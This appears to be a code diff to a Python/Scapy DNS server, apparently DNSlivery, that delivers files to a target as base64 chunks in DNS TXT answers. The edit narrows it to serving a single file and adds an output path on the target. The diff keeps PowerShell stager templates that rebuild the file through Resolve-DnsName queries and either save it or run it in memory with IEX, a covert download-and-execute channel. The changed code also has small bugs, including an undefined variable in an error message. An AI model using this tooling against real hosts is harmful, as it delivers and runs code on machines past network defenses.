@@ -60,30 +60,16 @@ def dns_handler(data):
             if args.verbose: log('Received DNS query for %s from %s' % (dnsqr.qname.decode(), ip.src))
 
             # remove domain part of fqdn and split the different parts of hostname
-            hostname = re.sub('\.%s\.$' % args.domain, '', dnsqr.qname.decode()).split('.')
+            hostname = re.sub('%s\.$' % args.domain, '', dnsqr.qname.decode()).split('.')[0]
+            hostname = hostname.removeprefix('d')
 
-            # check if hostname match existing file 
-            if len(hostname) > 0 and hostname[0] in chunks:
-                
-                # launcher response (default): file.domain
-                if len(hostname) == 1: hostname.append('print')
-
-                # launcher response: file.stager.domain
-                if len(hostname) == 2 and hostname[1] in ['print', 'exec', 'save']:
-                    response = launcher_template % (len(stagers[hostname[0]][hostname[1]]), hostname[0], hostname[1], args.domain)
-                    log('Delivering %s %s launcher to %s' % (hostname[0], hostname[1], ip.src), '+')
-
-                # stager response: file.stager.i.domain
-                elif len(hostname) == 3 and hostname[2].isdecimal() and int(hostname[2]) > 0 and int(hostname[2]) <= len(stagers[hostname[0]][hostname[1]]):
-                    response = stagers[hostname[0]][hostname[1]][int(hostname[2])-1]
-                    log('Delivering %s %s stager %s/%d to %s' % (hostname[0], hostname[1], int(hostname[2]), len(stagers[hostname[0]][hostname[1]]), ip.src), '+')
-
-                # base64 chunk response: file.i
-                elif len(hostname) > 1 and hostname[1].isdecimal() and int(hostname[1]) > 0 and int(hostname[1]) <= len(chunks[hostname[0]]):
-                    response = chunks[hostname[0]][int(hostname[1])-1]
-                    log('Delivering %s chunk %s/%d to %s' % (hostname[0], int(hostname[1]), len(chunks[hostname[0]]), ip.src), '+')
-
-                else: return
+            try:
+                int(hostname)
+            except:
+                pass
+            else:
+                response = chunks[int(hostname)-1]
+                log('Delivering chunk %s/%d to %s' % (int(hostname), len(chunks), ip.src), '+')
 
                 # build response packet
                 rdata = response
@@ -94,7 +80,7 @@ def dns_handler(data):
 
                 response_pkt = IP(id=ip.id, src=ip.dst, dst=ip.src) / UDP(sport=udp.dport, dport=udp.sport) / DNS(id=dns.id, qr=1, rd=1, ra=1, rcode=rcode, qd=dnsqr, an=an, ns=ns)
                 send(response_pkt, verbose=0, iface=args.interface)
-        
+
 
 if __name__ == '__main__':
     # parse args
@@ -103,6 +89,7 @@ if __name__ == '__main__':
     parser.add_argument('domain', default=None, help='FQDN name of the DNS zone')
     parser.add_argument('nameserver', default=None, help='FQDN name of the server running DNSlivery')
     parser.add_argument('-p', '--path', default='.', help='path of directory to serve over DNS (default: pwd)')
+    parser.add_argument('-o', '--output', required=True, help='output path on target')
     parser.add_argument('-s', '--size', default='255', help='size in bytes of base64 chunks (default: 255)')
     parser.add_argument('-v', '--verbose', action='store_true', help='increase verbosity')
     args = parser.parse_args()
@@ -117,16 +104,9 @@ if __name__ == '__main__':
     # verify path exists and is readable
     abspath = os.path.abspath(args.path)
     
-    if not os.path.exists(abspath) or not os.path.isdir(abspath):
+    if not os.path.exists(abspath):
         log('Path %s does not exist or is not a directory' % abspath, '-')
         sys.exit(-1)
-
-    # list files in path
-    filenames = {}
-    for root, dirs, files in os.walk(abspath):
-        for name in files:
-            filenames[name] = ''
-        break
 
     # launcher and stagers template definition
     launcher_template = 'IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((1..%d|%%{Resolve-DnsName -ty TXT -na "%s.%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}))))'
@@ -134,45 +114,27 @@ if __name__ == '__main__':
     stager_templates = {
         'print': '[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((1..%d|%%{do{$error.clear();Write-Host "[*] Resolving chunk $_/%d";Resolve-DnsName -ty TXT -na "%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}until($error.count-eq0)})))',
         'exec': 'IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((1..%d|%%{do{$error.clear();Write-Host "[*] Resolving chunk $_/%d";Resolve-DnsName -ty TXT -na "%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}until($error.count-eq0)}))))',
-        'save': '[IO.File]::WriteAllBytes("$(Get-Location)\%s",[System.Convert]::FromBase64String((1..%d|%%{do{$error.clear();Write-Host "[*] Resolving chunk $_/%d";Resolve-DnsName -ty TXT -na "%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}until($error.count-eq0)})))',
+        'save': '[IO.File]::WriteAllBytes("%s",[System.Convert]::FromBase64String((1..%d|%%{do{$error.clear();Resolve-DnsName -ty TXT -na "d$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}until($error.count-eq0)})))',
     }
 
-    # for each file, sanitize filename compute chunks and generate stagers (main file processing loop)
-    chunks = {}
-    stagers = {}
+    # verify args.size is decimal
+    if not args.size.isdecimal():
+        log('Incorrect size value for base64 chunks', '-')
+        sys.exit(-1)
 
-    for name in filenames:
-        # sanitize filenames to be hostname-compliant (64 max, 254 fqdn max, [a-z0-9\-])
-        sanitized = re.sub(r'[^\x00-\x7F]','', name)        # remove non-ascii chars (see unidecode to replace with nearest ascii char)
-        sanitized = sanitized.lower()                       # lower all chars
-        sanitized = re.sub('[^a-z0-9\-]', '-', sanitized)   # replace chars outside charset to '-'
-        filenames[name] = sanitized
+    size = int(args.size)
+    try:
+        # compute base64 chunks of files
+        with open(abspath, 'rb') as f:
+            chunks = base64_chunks(f.read(), size)
+    except:
+        log('Error computing base64 for %s, file will been ignored' % name, '-')
 
-        # verify args.size is decimal
-        if not args.size.isdecimal():
-            log('Incorrect size value for base64 chunks', '-')
-            sys.exit(-1)
+    stager = stager_templates['save'] % (args.output, len(chunks), args.domain)
+    print(stager + '\n')
 
-        size = int(args.size)
-
-        try:
-            # compute base64 chunks of files
-            with open(os.path.join(abspath, name), 'rb') as f: chunks[filenames[name]] = base64_chunks(f.read(), size)
-
-        except:
-            # remove key from dict in case of failure (e.g. file permissions)
-            del filenames[name]
-            log('Error computing base64 for %s, file will been ignored' % name, '-')
-            break
-
-        # generate stagers
-        stagers[filenames[name]] = {}
-        stagers[filenames[name]]['print'] = base64_chunks(bytearray(stager_templates['print'] % (len(chunks[filenames[name]]), len(chunks[filenames[name]]), filenames[name], args.domain), 'utf-8'), size)
-        stagers[filenames[name]]['exec'] = base64_chunks(bytearray(stager_templates['exec'] % (len(chunks[filenames[name]]), len(chunks[filenames[name]]), filenames[name], args.domain), 'utf-8'), size)
-        stagers[filenames[name]]['save'] = base64_chunks(bytearray(stager_templates['save'] % (name, len(chunks[filenames[name]]), len(chunks[filenames[name]]), filenames[name], args.domain), 'utf-8'), size)
-
-        # display file ready for delivery
-        log('File "%s" ready for delivery at %s.%s (%d chunks)' % (name, filenames[name], args.domain, len(chunks[filenames[name]])))
+    # display file ready for delivery
+    log('File "%s" ready for delivery at %s (%d chunks)' % (abspath, args.domain, len(chunks)))
 
     # register signal handler
     signal.signal(signal.SIGINT, signal_handler)
